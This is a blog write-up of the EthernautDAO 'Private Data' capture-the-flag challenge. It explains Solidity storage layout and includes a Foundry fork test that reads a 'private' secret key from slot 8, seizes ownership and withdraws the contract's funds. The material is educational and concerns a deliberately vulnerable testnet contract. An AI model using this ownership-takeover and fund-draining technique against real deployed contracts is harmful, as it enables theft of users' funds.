---
title: 'EthernautDAO CTF 1 — Private Data Solution'
excerpt: ΞthernautDAO is common goods DAO aimed at transforming developers into Ethereum developers. </br></br>Our goal for this challenge is to be able to take the ownership of the contract by calling the function `takeOwnership`  and then withdraw all the contract's funds by calling the `withdraw` function that can be called only by the owner of the contract.
coverImage:
  url: '/assets/blog/ethernautdao.jpeg'
  credit:
    name: ΞthernautDAO
    url: https://twitter.com/EthernautDAO
date: '2022-07-11T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernautdao.jpeg'
---

[ΞthernautDAO](https://twitter.com/EthernautDAO) is common goods DAO aimed at transforming developers into Ethereum developers.

They started releasing CTF challenges on Twitter, so how couldn't I start solving them?

[https://twitter.com/EthernautDAO/status/1543957806532833282](https://twitter.com/EthernautDAO/status/1543957806532833282)

## CTF 1: Private Data

The contract [0x620e0c88e0f8f36bcc06736138bded99b6401192](https://goerli.etherscan.io/address/0x620e0c88e0f8f36bcc06736138bded99b6401192) has been deployed on the Goerli network.

> Anyone can deposit ether, but only the owner can withdraw
> During contract creation a secret key is set, which allows o transfer ownership of the contract

Our goal for this challenge is to be able to take the ownership of the contract by calling the function `takeOwnership` and then withdraw all the contract's funds by calling the `withdraw` function that can be called only by the owner of the contract.

## Study the contracts

Let's start by reading the `constructor` code

```solidity
constructor(string memory rndString) {
    owner = msg.sender;

    // create a random number and store it in a private variable
    secretKey = uint256(
        keccak256(
            abi.encodePacked(
                blockhash(block.number - 1),
                block.timestamp,
                rndString
            )
        )
    );
}
```

Inside the `constructor` the deployer set up the `owner` equal to `msg.sender` and then initialize a `secretKey`.

To become the new owner of the contract and be able to call `takeOwnership` we must be able to reconstruct this secret key.

The first thing that you must remember when you use or develop on the blockchain is that **nothing** is private in the blockchain. Everything can be seen even if you declare a variable as `private` or `internal`. I suggest you to read more about this concept by reading [“SWC-136: Unencrypted Private Data On-Chain”](https://swcregistry.io/docs/SWC-136).

I'm saying this because the owner of the contract would think that there is no way that I would be able to read directly a `private` state variable. But in reality, we have two different way to do that:

1. you could re-construct the key by reviewing the deployment data on Etherscan or Tenderly
2. you could just fork the Goerli network in a block after the deployment and use [Foundry's Cheatcode](https://book.getfoundry.sh/forge/cheatcodes.html) to read the slot where that value is stored

We will go with the second options just because I think that it's more fun :D

First, we need to understand how the [Layout of State variables in Storage](https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage) work.

- Each storage slot will use 32 bytes (word size)
- For each variable, a size in bytes is determined according to its type
- Multiple, contiguous items that need less than 32 bytes are packed into a single storage slot if possible according to the following rules:
  - The first item in a storage slot is stored lower-order aligned.
  - Value types use only as many bytes as are necessary to store them.
  - If a value type does not fit the remaining part of a storage slot, it is stored in the next storage slot.
  - Structs and array data always start a new slot and their items are packed tightly according to these rules.
  - Items following struct or array data always start a new storage slot.

Let's now look at the Contract variables layout:

```solidity
    uint256 public constant NUM = 1337;
    address public owner;
    bytes32[5] private randomData;
    mapping(address => uint256) public addressToKeys;
    uint128 private a;
    uint128 private b;
    uint256 private secretKey;
```

First thing to note is that `constant` and `immutable` variables will not take a storage slot because they will be directly replaced in the code at compile time or during deployment time (immutable). See more on the ["Constant and Immutable State Variables"](https://docs.soliditylang.org/en/v0.8.15/contracts.html?highlight=constant#constant-and-immutable-state-variables) documentation page.

So let's make some math, given each variable type we can know which slot they will use:

- `owner` will be at **slot0**
- `randomData` will take slot **from slot1 to slot5** because it is a static array of five elements
- `addressToKeys` will take **slot6**. For mapping and dynamic arrays, it's the layout is a little more complicated, but it's not relevant for this challenge. I anyway suggestion to read more on ["Mappings and Dynamic Arrays"](https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#mappings-and-dynamic-arrays) documentation page.
- `a` and `b` variable will use the same **slot7** because they take in total 32 bytes
- This mean that our `secretKey` variable will take **slot8**!

Why is so important to know which slot is used by our variable?

Because by forking the chain and by using Foundry Cheatcode we can directly read a Contract's slot value in a specific block in time even if the variable is private!

## Solution code

Now what we need to do is:

- Create an Alchemy or Infura account to be able to fork the Goerli blockchain
- Choose a good block from which we can create a fork. Any block after the creation of the contract will be good
- Run a foundry test that will use the fork, read the slot, print it out and boom! We know which is the `secretKey`

Here's the code that I used for the test:

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/PrivateData.sol";

contract PrivateDataTest is BaseTest {
    PrivateData private privateData;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        privateData = PrivateData(payable(0x620E0c88E0f8F36bCC06736138bDEd99B6401192));

        vm.label(address(privateData), "PrivateData");
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player);

        // assert we are not the owners
        address owner = privateData.owner();
        assertEq(owner == player, false);

        // load the secret key slot from slot 9
        bytes32 secretKeyBytes = vm.load(address(privateData), bytes32(uint256(8)));
        uint256 secretKey = uint256(secretKeyBytes);

        console.log("secretKey", secretKey);

        // take the ownership of the contract
        privateData.takeOwnership(secretKey);

        // assert we are the onwer
        assertEq(privateData.owner(), player);

        // withdraw all the funds, if we are the owner it shoud not revert
        privateData.withdraw();

        vm.stopPrank();
    }
}
```

Here is the command I have used to run the test: `forge test --match-contract PrivateDataTest --fork-url <your_rpc_url> --fork-block-number 7178864 -vv`

Just remember to replace `<your_rpc_url>` with the RPC URL you got from Alchermy or Infura.

Now we can go directly on Etherscan and call `takeOwnership` passing the `secretKey` we just printed in the console.

You can read the full solution of the challenge, opening [PrivateData.t.sol](https://github.com/StErMi/ethernautdao-ctf/blob/main/test/PrivateData.t.sol)

## Further reading

- [SWC-136: Unencrypted Private Data On-Chain](https://swcregistry.io/docs/SWC-136)
- [Foundry's Cheatcode](https://book.getfoundry.sh/forge/cheatcodes.html)
- [Layout of State variables in Storage](https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#layout-of-state-variables-in-storage)
- [Constant and Immutable State Variables](https://docs.soliditylang.org/en/v0.8.15/contracts.html?highlight=constant#constant-and-immutable-state-variables)
- ["Mappings and Dynamic Arrays"](https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html#mappings-and-dynamic-arrays)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
